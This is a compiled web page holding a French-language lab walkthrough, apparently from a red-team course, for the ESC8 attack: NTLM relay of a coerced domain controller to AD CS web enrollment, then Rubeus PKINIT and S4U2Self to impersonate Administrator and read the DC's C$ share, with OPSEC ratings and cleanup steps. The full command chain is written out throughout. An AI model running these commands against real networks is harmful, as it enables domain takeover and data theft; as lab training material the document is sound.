import{_ as t,o as a,c as s,am as i}from"./chunks/framework.yj4qiWdr.js";const h=JSON.parse('{"title":"ESC8 - NTLM Relay vers les endpoints HTTP AD CS","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/esc8.md","filePath":"crto/liham/labs/esc8.md"}'),o={name:"crto/liham/labs/esc8.md"};function l(r,e,n,c,p,d){return a(),s("div",null,e[0]||(e[0]=[i('<h1 id="esc8-ntlm-relay-vers-les-endpoints-http-ad-cs" tabindex="-1">ESC8 - NTLM Relay vers les endpoints HTTP AD CS <a class="header-anchor" href="#esc8-ntlm-relay-vers-les-endpoints-http-ad-cs" aria-label="Permalink to &quot;ESC8 - NTLM Relay vers les endpoints HTTP AD CS&quot;">​</a></h1><blockquote><p>L’objectif de ce lab est d’identifier et d’exploiter <strong>ESC8</strong>.</p></blockquote><hr><h2 id="enumeration" tabindex="-1">Énumération <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Énumération&quot;">​</a></h2><ol><li><p>Lancer Cobalt Strike et se connecter au team server.</p></li><li><p>Énumérer les vulnérabilités de la <strong>Certificate Authority (CA)</strong>. 🔍</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet</span></span></code></pre></div></li></ol><p>⚠️ Le résultat doit montrer que <code>lon-cs-1</code> est vulnérable à ESC8.</p><hr><h2 id="preparation-du-ntlm-relay" tabindex="-1">Préparation du NTLM Relay <a class="header-anchor" href="#preparation-du-ntlm-relay" aria-label="Permalink to &quot;Préparation du NTLM Relay&quot;">​</a></h2><ol><li><p>Démarrer un <strong>SOCKS proxy</strong> depuis le Beacon.</p><ol><li><code>socks 1080 socks5</code></li></ol></li><li><p>Exécuter <code>netstat</code> pour vérifier que le port 445 est actuellement occupé.</p></li><li><p>Définir le mode de démarrage de <code>lanmanserver</code> sur <strong>disabled</strong> pour empêcher un redémarrage automatique.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>sc_config lanmanserver &quot;C:\\Windows\\system32\\svchost.exe -k netsvcs -p&quot; 1 4</span></span></code></pre></div></li><li><p>Arrêter les services suivants dans cet ordre pour libérer le port 445.</p><ol><li><code>sc_stop lanmanserver</code></li><li><code>sc_stop srv2</code></li><li><code>sc_stop srvnet</code></li></ol></li></ol><p>⚠️ Vérifier avec <code>netstat</code> que le port 445 est libre.</p><ol start="5"><li>Créer un <strong>reverse port forward</strong> sur le port 445 pour rediriger le trafic vers <code>127.0.0.1:7445</code> sur l’Attacker Desktop. <ol><li><code>rportfwd_local 445 localhost 7445</code></li></ol></li></ol><p>⚠️ <code>netstat</code> indique de nouveau une écoute sur le port 445, mais le PID est celui du Beacon.</p><ol start="6"><li><p>Le port 445 peut être bloqué en entrée par Windows Firewall, notamment sur une Workstation. Ajouter la règle :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick New-NetFirewallRule -DisplayName &quot;File Sharing&quot; -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445</span></span></code></pre></div></li></ol><hr><h2 id="ntlm-relaying" tabindex="-1">NTLM Relaying <a class="header-anchor" href="#ntlm-relaying" aria-label="Permalink to &quot;NTLM Relaying&quot;">​</a></h2><ol><li><p>Sur l’Attacker Desktop, ouvrir un terminal CMD et démarrer le container Docker Kali.</p><ol><li><code>docker container start -i kali-1</code></li></ol></li><li><p>Configurer <strong>proxychains</strong> pour utiliser le SOCKS proxy de Cobalt Strike.</p><ol><li>Ouvrir <code>/etc/proxychains.conf</code> dans vim ou nano.</li><li>Aller à la dernière ligne.</li><li>Remplacer l’entrée <code>socks4</code> par défaut 💡 <code>socks5 10.0.0.5 1080</code>💡</li><li>Enregistrer les modifications.</li></ol></li><li><p>Utiliser <strong>ntlmrelayx</strong> et <strong>proxychains</strong> pour relayer les authentifications entrantes vers l’endpoint HTTP AD CS. Comme la requête cible un Domain Controller, demander un certificat de type <strong>DomainController</strong>. Démarrer <code>NTLMRelayX</code> depuis le container Kali.</p><div class="language-bash vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#FFA657;">proxychains</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> impacket-ntlmrelayx</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> http://10.10.120.5/certsrv/certfnsh.asp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> -smb2support</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> --adcs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> --template</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> DomainController</span></span></code></pre></div></li><li><p>Pendant l’attente, revenir au Beacon.</p></li><li><p>Déclencher une authentification du Domain Controller vers la machine courante.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108</span></span></code></pre></div></li></ol><p>⚠️ Le reverse port forward transmet la requête à ntlmrelayx, qui la relaie via le SOCKS proxy. Un fichier <strong>LON-DC-1.pfx</strong> doit être généré.</p><ol start="6"><li>Utiliser Ctrl+C pour arrêter ntlmrelayx.</li></ol><hr><h2 id="post-exploitation-lon-dc-1-pfx-vers-domain-administrator" tabindex="-1">Post-Exploitation - LON-DC-1.pfx vers Domain Administrator <a class="header-anchor" href="#post-exploitation-lon-dc-1-pfx-vers-domain-administrator" aria-label="Permalink to &quot;Post-Exploitation - LON-DC-1.pfx vers Domain Administrator&quot;">​</a></h2><blockquote><p><strong>Effectuer ces étapes avant le cleanup</strong>, tant que le SOCKS proxy est actif. Le PFX est dans le container Kali. Deux possibilités sont documentées : Kali Docker (PKINITtools/Certipy, sans transfert) et Windows Beacon (Rubeus, avec transfert du PFX).</p></blockquote><h3 id="methode-windows-beacon-rubeus-cobalt-strike" tabindex="-1">Méthode - Windows Beacon (Rubeus / Cobalt Strike) <a class="header-anchor" href="#methode-windows-beacon-rubeus-cobalt-strike" aria-label="Permalink to &quot;Méthode - Windows Beacon (Rubeus / Cobalt Strike)&quot;">​</a></h3><h4 id="etape-1-copier-le-certificat-et-encoder-le-pfx-en-base64" tabindex="-1">Étape 1 - Copier le certificat et encoder le PFX en Base64 <a class="header-anchor" href="#etape-1-copier-le-certificat-et-encoder-le-pfx-en-base64" aria-label="Permalink to &quot;Étape 1 - Copier le certificat et encoder le PFX en Base64&quot;">​</a></h4><p>Rechercher le fichier dans le container Kali :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>find / -name &quot;LON-DC-1.pfx&quot; 2&gt;/dev/null</span></span></code></pre></div><p>Copier le certificat depuis le container Kali vers Windows :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>docker cp kali-1:/LON-DC-1.pfx C:\\Tools\\LON-DC-1.pfx</span></span></code></pre></div><p>Exécuter la commande dans PowerShell sur l’Attacker Desktop :</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ToBase64String([</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ReadAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Tools\\LON-DC-1.pfx&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><p>Copier la totalité du résultat Base64.</p><h4 id="etape-2-demander-le-tgt-du-compte-machine-dc-via-pkinit" tabindex="-1">Étape 2 - Demander le TGT du compte machine DC via PKINIT <a class="header-anchor" href="#etape-2-demander-le-tgt-du-compte-machine-dc-via-pkinit" aria-label="Permalink to &quot;Étape 2 - Demander le TGT du compte machine DC via PKINIT&quot;">​</a></h4><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:&lt;base64_pfx_string&gt; /enctype:aes256 /nowrap</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE (no disk write on target)</strong> - Le certificat est transmis en mémoire comme argument Rubeus, sans écriture dans le filesystem cible. <code>execute-assembly</code> crée néanmoins un processus temporaire (<strong>CAUTION</strong>). La requête PKINIT AS-REQ génère l’<strong>Event 4768</strong> sur le DC. Conserver le TGT Base64 renvoyé.</p></blockquote><h4 id="etape-3-s4u2self-pour-impersonate-administrator" tabindex="-1">Étape 3 - S4U2Self pour impersonate Administrator <a class="header-anchor" href="#etape-3-s4u2self-pour-impersonate-administrator" aria-label="Permalink to &quot;Étape 3 - S4U2Self pour impersonate Administrator&quot;">​</a></h4><p>Utiliser le TGT du compte machine du DC pour effectuer <strong>S4U2Self</strong> et demander un ticket CIFS en tant qu’Administrator. L’option <code>/self</code> sélectionne S4U2Self ; S4U2Proxy n’est pas nécessaire ici.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> - Génère l’<strong>Event 4769</strong> (TGS-REQ S4U2Self) sur le DC. L’option <code>/ptt</code> injecte le ticket dans la session de logon du Beacon, sans écriture sur disque.</p></blockquote><h4 id="etape-4-verifier-l-acces-domain-admin" tabindex="-1">Étape 4 - Vérifier l’accès Domain Admin <a class="header-anchor" href="#etape-4-verifier-l-acces-domain-admin" aria-label="Permalink to &quot;Étape 4 - Vérifier l’accès Domain Admin&quot;">​</a></h4><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ls \\\\lon-dc-1.contoso.com\\C$</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> - Accès SMB via le ticket Kerberos injecté. Génère l’<strong>Event 4624 type 3</strong> sur le DC, sans création de processus distant ni de service.</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>download \\\\lon-dc-1.contoso.com\\C$\\Users\\Administrator\\Desktop\\root.txt</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> - Lecture du fichier par le canal C2 du Beacon. L’<strong>Event 4663</strong> peut être généré sur le DC si l’audit Object Access est activé.</p></blockquote><hr><h3 id="recapitulatif-opsec-de-la-chaine-esc8" tabindex="-1">Récapitulatif OPSEC de la chaîne ESC8 <a class="header-anchor" href="#recapitulatif-opsec-de-la-chaine-esc8" aria-label="Permalink to &quot;Récapitulatif OPSEC de la chaîne ESC8&quot;">​</a></h3><table tabindex="0"><thead><tr><th>Étape</th><th>Action</th><th>OPSEC</th><th>Events principaux</th></tr></thead><tbody><tr><td>Énumération</td><td>Certify enum-cas</td><td>OPSEC-🟠CAUTION</td><td>LDAP vers le DC (1644)</td></tr><tr><td>Préparation Relay</td><td>Stop lanmanserver / rportfwd</td><td>OPSEC-🟠CAUTION</td><td>Événements de service (7036)</td></tr><tr><td>Coercition</td><td>SharpSpoolTrigger</td><td>OPSEC-🔴UNSAFE</td><td>RPC Print Spooler - Event 4624 sur la cible</td></tr><tr><td>Relay</td><td>ntlmrelayx → AD CS</td><td>OPSEC-🟠CAUTION</td><td>Events CA 4886/4887 enregistrés</td></tr><tr><td>Vérification DA</td><td>smbclient / ls C$</td><td>OPSEC-🟢SAFE</td><td>Event 4624 type 3 sur le DC</td></tr><tr><td>Cleanup</td><td>Restaurer services / firewall</td><td>OPSEC-🟢SAFE</td><td>Réduit les artefacts laissés</td></tr></tbody></table><h2 id="cleanup-restauration" tabindex="-1">Cleanup - Restauration <a class="header-anchor" href="#cleanup-restauration" aria-label="Permalink to &quot;Cleanup - Restauration&quot;">​</a></h2><ol><li><p>Arrêter le SOCKS proxy.</p><ol><li><code>socks stop</code></li></ol></li><li><p>Arrêter le reverse port forward.</p><ol><li><code>rportfwd stop 445</code></li></ol></li><li><p>Restaurer les services dans leur configuration d’origine.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>sc_config lanmanserver &quot;C:\\Windows\\system32\\svchost.exe -k netsvcs -p&quot; 1 2</span></span></code></pre></div><ol><li><code>sc_start srvnet</code></li><li><code>sc_start srv2</code></li><li><code>sc_start lanmanserver</code></li></ol></li><li><p>Supprimer la règle Windows Firewall.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick Remove-NetFirewallRule -DisplayName &quot;File Sharing&quot;</span></span></code></pre></div></li></ol><p>⚠️ Ce lab présente l’identification et l’exploitation d’ESC8 depuis un C2.</p>',48)]))}const m=t(o,[["render",l]]);export{h as __pageData,m as default};
